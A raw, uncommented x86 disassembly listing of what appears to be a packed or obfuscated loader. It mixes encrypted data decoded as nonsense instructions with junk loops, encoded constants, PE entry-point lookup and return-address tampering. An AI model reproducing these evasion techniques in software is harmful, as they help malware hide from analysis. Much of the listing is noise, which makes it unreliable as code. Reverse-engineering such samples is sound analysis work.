  406162:	lds    ecx,FWORD PTR [ebx]
  406164:	jo     0x4060f2
  406166:	icebp  
  406167:	sub    ebp,esp
  406169:	sub    al,0xd2
  40616b:	lea    ebx,[edi+0x974ff64]
  406171:	xchg   esi,eax
  406172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406173:	loop   0x4061ac
  406175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406176:	sbb    DWORD PTR [ebx+eiz*2+0x4dd374fd],0x7f
  40617e:	adc    DWORD PTR [ecx],0xffffff89
  406181:	adc    eax,0x9294114f
  406186:	jle    0x406160
  406188:	ins    BYTE PTR es:[edi],dx
  406189:	mov    esi,0x8299b4e6
  40618e:	cwde   
  40618f:	enter  0xe7a5,0xc7
  406193:	adc    BYTE PTR [esi+0x4f],dl
  406196:	je     0x406213
  406198:	retf   0x89e4
  40619b:	pop    ebp
  40619c:	xor    al,0x84
  40619e:	imul   edi,DWORD PTR [esi+edx*1+0x6c],0xffffffdf
  4061a3:	or     eax,DWORD PTR [ebp+0x56835b52]
  4061a9:	mov    ecx,0xff59e29f
  4061ae:	mov    ah,0x8
  4061b0:	dec    esp
  4061b1:	fild   DWORD PTR [ebp-0x3a3a5095]
  4061b7:	rcl    BYTE PTR [eax-0x7b83b836],1
  4061bd:	mov    dl,0xb4
  4061bf:	aas    
  4061c0:	jl     0x4061f0
  4061c2:	shl    DWORD PTR [ebx+edx*8-0x9d9b3dd],0xa4
  4061ca:	popa   
  4061cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061cc:	gs repz jle 0x40618f
  4061d0:	bound  edx,QWORD PTR [esi+0x49]
  4061d3:	xor    edi,DWORD PTR [ebp-0x21814f63]
  4061d9:	jl     0x406253
  4061db:	jno    0x4061da
  4061dd:	sbb    ebp,edx
  4061df:	stos   BYTE PTR es:[edi],al
  4061e0:	lahf   
  4061e1:	retf   
  4061e2:	ss and dh,dl
  4061e5:	mov    ebp,0xe33a6e48
  4061ea:	sbb    ecx,DWORD PTR [esi-0x1a]
  4061ed:	fwait
  4061ee:	jnp    0x40617e
  4061f0:	mov    DWORD PTR [ecx],esi
  4061f2:	lods   eax,DWORD PTR ds:[esi]
  4061f3:	sbb    eax,DWORD PTR [ecx]
  4061f5:	dec    eax
  4061f6:	sbb    edx,ecx
  4061f8:	cmp    eax,0xcac504c0
  4061fd:	cmp    dl,BYTE PTR [esi]
  4061ff:	push   cs
  406200:	cmc    
  406201:	loopne 0x4061e2
  406203:	ror    edx,cl
  406205:	pop    edx
  406206:	fcmovnbe st,st(7)
  406208:	push   eax
  406209:	mov    ch,0x1
  40620b:	pop    edx
  40620c:	mov    dl,0xc1
  40620e:	(bad)  [edx+0x12]
  406211:	sbb    esp,DWORD PTR [ecx-0x4]
  406214:	add    eax,DWORD PTR [ebx]
  406216:	jl     0x406214
  406218:	test   DWORD PTR [edi-0x15],esi
  40621b:	xor    al,0xfc
  40621d:	xor    BYTE PTR [ebx-0x2efd3478],0x6d
  406224:	call   edx
  406226:	je     0x406245
  406228:	dec    ebx
  406229:	shr    esp,0x44
  40622c:	jo     0x406271
  40622e:	cmp    eax,0x27c1c3b0
  406233:	cli    
  406234:	sub    eax,0x9a24a9ab
  406239:	sub    ah,BYTE PTR [ecx-0x22]
  40623c:	stos   DWORD PTR es:[edi],eax
  40623d:	(bad)  
  40623e:	cli    
  40623f:	jmp    0x625f0efa
  406244:	push   ss
  406245:	adc    esp,DWORD PTR [esi]
  406247:	xor    eax,0xe113798f
  40624c:	push   0x16
  40624e:	out    dx,al
  40624f:	cld    
  406250:	ja     0x406253
  406252:	inc    esp
  406253:	xor    al,0xf
  406255:	pop    ebp
  406256:	outs   dx,DWORD PTR ds:[esi]
  406257:	(bad)  
  406258:	jns    0x406275
  40625a:	mov    ebp,0xc89b6eaa
  40625f:	bnd ret 0x7363
  406263:	sub    dh,BYTE PTR [ebx]
  406265:	lock and DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406312:	inc    ebp
  406313:	lahf   
  406314:	pop    ss
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	clc    
  40631e:	(bad)  
  406320:	adc    dl,BYTE PTR [esi-0x256ede49]
  406326:	fwait
  406327:	popa   
  406328:	jp     0x4062ed
  40632a:	dec    esp
  40632b:	xchg   DWORD PTR [ecx+0xd],ebx
  40632e:	adc    al,ah
  406330:	sbb    edx,edx
  406332:	push   ds
  406333:	xor    ch,BYTE PTR [esi-0x343e54aa]
  406339:	cmp    DWORD PTR [ebx-0x7c9ac7],ebx
  40633f:	int3   
  406340:	pop    ebp
  406341:	jno    0x40632e
  406343:	outs   dx,DWORD PTR ds:[esi]
  406344:	xchg   ebp,eax
  406345:	adc    al,0xfc
  406347:	push   esp
  406348:	test   BYTE PTR [edx+0x72],cl
  40634b:	push   edi
  40634c:	push   0xc
  40634e:	icebp  
  40634f:	fwait
  406350:	shl    ebp,0x4f
  406353:	je     0x4063c2
  406355:	pushf  
  406356:	or     eax,0xd07391ba
  40635b:	sbb    DWORD PTR [eax+ebp*1-0xae791b],ebp
  406362:	add    DWORD PTR es:[edx+esi*2+0x4f],ebp
  406367:	jg     0x40631e
  406369:	popa   
  40636a:	add    ebp,esp
  40636c:	cmp    al,ah
  40636e:	scas   eax,DWORD PTR es:[edi]
  40636f:	mov    BYTE PTR [eax],0xb5
  406372:	loop   0x406345
  406374:	jnp    0x4063dd
  406376:	xchg   edi,eax
  406377:	mov    al,ds:0x71706777
  40637c:	pop    ss
  40637d:	imul   ebp,DWORD PTR [ecx+0x7e],0xc8dec3f7
  406384:	mov    ebx,0x5777b89e
  406389:	ret    0x6adf
  40638c:	dec    eax
  40638d:	add    eax,DWORD PTR [esi+eax*4-0x79774a1c]
  406394:	test   DWORD PTR [edi+0x1f2fa566],esi
  40639a:	icebp  
  40639b:	mov    dl,0x1b
  40639d:	sbb    eax,edi
  40639f:	pop    edi
  4063a0:	mov    ecx,0x5c0b541a
  4063a5:	das    
  4063a6:	out    0x2,eax
  4063a8:	int3   
  4063a9:	imul   eax,DWORD PTR [esi-0x36],0xffffff9e
  4063ad:	call   0x9682:0xa7cbeb15
  4063b4:	pusha  
  4063b5:	mov    dl,0xcb
  4063b7:	jecxz  0x406426
  4063b9:	into   
  4063ba:	sub    bl,BYTE PTR [ecx+0x7f059ea]
  4063c0:	adc    esi,DWORD PTR [edx+0x4a]
  4063c3:	add    BYTE PTR [eax+0x177b984d],dh
  4063c9:	mov    esp,DWORD PTR es:[ebx+0x4f]
  4063cd:	xor    eax,0x4d3d1807
  4063d2:	mov    cl,0x54
  4063d4:	cmc    
  4063d5:	pop    ebp
  4063d6:	cli    
  4063d7:	fwait
  4063d8:	inc    ebx
  4063d9:	fstp   QWORD PTR [ecx-0x21]
  4063dc:	push   edx
  4063dd:	mov    ah,0x7b
  4063df:	jge    0x40642d
  4063e1:	in     eax,dx
  4063e2:	mov    ebx,0x6d8d3788
  4063e7:	repz dec ecx
  4063e9:	push   ss
  4063ea:	stos   DWORD PTR es:[edi],eax
  4063eb:	jb     0x40642c
  4063ed:	mov    dh,0xc3
  4063ef:	or     eax,0x68ea1a67
  4063f4:	iret   
  4063f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063f6:	data16 int3 
  4063f8:	shl    ch,0x15
  4063fb:	xor    ecx,DWORD PTR [ecx+0x6c]
  4063fe:	inc    edi
  4063ff:	js     0x4063ac
  406401:	xor    al,0x48
  406403:	inc    edi
  406404:	mov    ch,0x92
  406406:	adc    DWORD PTR [ecx-0x3242818c],esi
  40640c:	fiadd  WORD PTR [ecx+0x6d]
  40640f:	pop    edi
  406410:	sti    
  406411:	inc    esp
  406412:	push   0x46130264
  406417:	iret   
  406418:	or     DWORD PTR [ecx+0x4039ae30],ecx
  40641e:	clc    
  40641f:	mov    eax,ds:0x3b61ba1c
  406424:	and    cl,bl
  406426:	adc    esp,esp
  406428:	sub    edi,ebp
  40642a:	mov    eax,0x286a1ef
  40642f:	lahf   
  406430:	repz or BYTE PTR [edi],bh
  406433:	into   
  406434:	inc    ebp
  406435:	dec    esp
  406436:	mov    es,WORD PTR [eax-0x28]
  406439:	jns    0x406477
  40643b:	stos   DWORD PTR es:[edi],eax
  40643c:	fidivr DWORD PTR [ecx+0x61]
  40643f:	pusha  
  406440:	or     cl,bh
  406442:	das    
  406443:	push   esi
  406444:	fldenv [ebp-0x6348a535]
  40644a:	inc    esp
  40644b:	pop    esp
  40644c:	inc    esp
  40644d:	add    DWORD PTR gs:[edx+0x3be77b6],edx
  406454:	jae    0x4064d1
  406456:	or     BYTE PTR [eax],0xa8
  406459:	pusha  
  40645a:	shl    DWORD PTR [eax-0x25db2a1d],1
  406460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406461:	or     dl,BYTE PTR [esi-0x6dce623f]
  406467:	pop    ecx
  406468:	cmp    cl,BYTE PTR [ecx]
  40646a:	pop    es
  40646b:	pop    edx
  40646c:	call   0x6d1ae5c2
  406471:	mov    dh,0x61
  406473:	out    dx,al
  406474:	call   0x3c01246e
  406479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40647a:	lds    ebp,FWORD PTR [edx]
  40647c:	mov    edx,0x702b2f4b
  406481:	add    ch,bh
  406483:	icebp  
  406484:	jo     0x4064cc
  406486:	mov    eax,ss:0x34c07003
  40648c:	adc    BYTE PTR [ebx],ah
  40648e:	test   BYTE PTR ds:0x40d300a1,dl
  406494:	mov    ecx,DWORD PTR ds:0xcddafe3a
  40649a:	xchg   edx,eax
  40649b:	xchg   esp,eax
  40649c:	stc    
  40649d:	dec    edi
  40649e:	call   0xbed8c488
  4064a3:	pushf  
  4064a4:	dec    ebp
  4064a5:	jg     0x406522
  4064a7:	mov    ebp,0xff32224d
  4064ac:	push   esi
  4064ad:	ja     0x406488
  4064af:	add    esp,esp
  4064b1:	cmc    
  4064b2:	jp     0x406480
  4064b4:	dec    esp
  4064b5:	scas   al,BYTE PTR es:[edi]
  4064b6:	xor    dl,BYTE PTR [esi+0x5e]
  4064b9:	cs inc ebx
  4064bb:	dec    ecx
  4064bc:	sub    eax,0x4125ba82
  4064c1:	pop    es
  4064c2:	enter  0x1186,0x58
  4064c6:	xchg   esp,eax
  4064c7:	stc    
  4064c8:	or     al,0x6
  4064ca:	cdq    
  4064cb:	sub    dh,BYTE PTR [ecx]
  4064cd:	popa   
  4064ce:	push   edi
  4064cf:	into   
  4064d0:	outs   dx,DWORD PTR ds:[esi]
  4064d1:	loopne 0x4064cc
  4064d3:	out    dx,eax
  4064d4:	push   es
  4064d5:	or     cl,ch
  4064d7:	xlat   BYTE PTR ds:[ebx]
  4064d8:	xchg   ebx,eax
  4064d9:	inc    esp
  4064da:	loope  0x406484
  4064dc:	fisttp QWORD PTR [edi-0x5e]
  4064df:	pop    eax
  4064e0:	or     ecx,eax
  4064e2:	ror    DWORD PTR [edx-0x75],0xaf
  4064e6:	xchg   esp,eax
  4064e7:	sbb    dl,BYTE PTR fs:[esp+ebp*4-0x6efbeeea]
  4064ef:	retf   
  4064f0:	inc    ebp
  4064f1:	ror    BYTE PTR [edi+0x3ff4f93],0x5a
  4064f8:	cdq    
  4064f9:	(bad)  
  4064fa:	imul   esi,esp,0xf8ca21a9
  406500:	and    dl,ah
  406502:	das    
  406503:	das    
  406504:	adc    eax,0x35b6386a
  406509:	mov    DWORD PTR [ebx-0x52],0xb2470709
  406510:	pushf  
  406511:	jle    0x406552
  406513:	in     al,0xf4
  406515:	pusha  
  406516:	pop    edx
  406517:	adc    ecx,DWORD PTR [ebp-0x31faa221]
  40651d:	aaa    
  40651e:	jbe    0x406558
  406520:	xlat   BYTE PTR ds:[ebx]
  406521:	in     eax,0xcf
  406523:	lods   eax,DWORD PTR ds:[esi]
  406524:	enter  0x2c1e,0x1a
  406528:	xchg   ax,ax
  40652a:	mov    bl,BYTE PTR [ecx-0x273ad30c]
  406530:	pop    edx
  406531:	fstp   TBYTE PTR [esi-0x7921db46]
  406537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406538:	adc    eax,0x2b8d6e47
  40653d:	into   
  40653e:	push   ebx
  40653f:	clc    
  406540:	jbe    0x406563
  406542:	or     al,BYTE PTR [esi+0x36]
  406545:	push   ss
  406546:	out    dx,eax
  406547:	addr16 jge 0x4065a9
  40654a:	xor    edx,DWORD PTR [esi-0x6b]
  40654d:	inc    esi
  40654e:	and    al,0x41
  406550:	int3   
  406551:	lock test DWORD PTR [edi-0x77],0xc15cf554
  406559:	(bad)  
  40655a:	pop    es
  40655b:	add    ch,BYTE PTR [edx]
  40655d:	(bad)  
  40655e:	pop    ss
  40655f:	mov    bh,0xa8
  406561:	ss mov ebp,gs
  406564:	in     eax,dx
  406565:	cmc    
  406566:	cmp    al,0xb6
  406568:	mov    al,ds:0xd3395197
  40656d:	and    dh,BYTE PTR [edi]
  40656f:	retf   0x7dcf
  406572:	mov    DWORD PTR [esi+0x6b9100bc],esi
  406578:	sahf   
  406579:	jl     0x4065b6
  40657b:	jl     0x406535
  40657d:	cdq    
  40657e:	inc    ebp
  40657f:	mov    ds:0x27a1b127,al
  406584:	sub    al,0xfa
  406586:	(bad)  
  406587:	(bad)  
  406588:	adc    al,0x6
  40658a:	adc    DWORD PTR [edi-0x5b],ebx
  40658d:	push   edi
  40658e:	popa   
  40658f:	xchg   esp,eax
  406590:	xor    eax,0xa4f80a56
  406595:	sub    BYTE PTR ds:[ecx],al
  406598:	icebp  
  406599:	test   BYTE PTR [ebx+eiz*4],0xd9
  40659d:	add    BYTE PTR [ebp+esi*8+0x1ea1c5be],bh
  4065a4:	les    edx,FWORD PTR [ebx+0x72f1dd12]
  4065aa:	mov    esi,0xb023a3f5
  4065af:	adc    BYTE PTR [eax-0x1f6a1e7f],cl
  4065b5:	sub    dl,dh
  4065b7:	imul   ecx,DWORD PTR [edi],0x535626db
  4065bd:	or     BYTE PTR [ebp-0x45],cl
  4065c0:	ins    DWORD PTR es:[edi],dx
  4065c1:	xor    edi,DWORD PTR [eax+edi*8]
  4065c4:	push   eax
  4065c5:	xor    DWORD PTR es:[ebp-0x10],ebx
  4065c9:	sbb    edx,DWORD PTR [edx+0x73cc9534]
  4065cf:	mov    edi,0x9911679f
  4065d4:	ja     0x406567
  4065d6:	out    dx,eax
  4065d7:	adc    BYTE PTR [ebx],bh
  4065d9:	add    BYTE PTR [ebx-0x446d7517],0x77
  4065e0:	and    BYTE PTR [edi-0x404e9619],0x8d
  4065e7:	and    DWORD PTR [esi+ecx*2-0x16a5fd10],0x4a
  4065ef:	inc    eax
  4065f0:	das    
  4065f1:	sbb    al,0xf9
  4065f3:	or     DWORD PTR [edx+0x15ec349],0xfffffffe
  4065fa:	out    0x92,eax
  4065fc:	add    al,0x20
  4065fe:	lods   al,BYTE PTR ds:[esi]
  4065ff:	shl    ah,cl
  406601:	shl    DWORD PTR [esi+0x7d],0x62
  406605:	cwde   
  406606:	xchg   esp,eax
  406607:	shl    BYTE PTR ds:0x46d5d660,0xf5
  40660e:	in     eax,0x3a
  406610:	push   ecx
  406611:	call   0xc8799ad
  406616:	fcmovu st,st(4)
  406618:	ins    BYTE PTR es:[edi],dx
  406619:	jmp    0xf8d35ac
  40661e:	jbe    0x4065f4
  406620:	mov    ?,WORD PTR [edx-0x6315cc2c]
  406626:	and    BYTE PTR [eax+eax*1-0x762b8ae7],bh
  40662d:	fs mov ah,0xc6
  406630:	and    BYTE PTR [edx-0x73],cl
  406633:	bound  edi,QWORD PTR [ecx]
  406635:	xchg   edi,eax
  406636:	(bad)  
  406637:	in     al,0x95
  406639:	push   ds
  40663a:	mov    cl,0x42
  40663c:	sub    edi,DWORD PTR [esi*2-0x7ffaef]
  406643:	enter  0x76b4,0x6d
  406647:	lock dec ebx
  406649:	je     0x4066a9
  40664b:	dec    edi
  40664c:	sbb    bh,bl
  40664e:	cmp    bh,0xd0
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
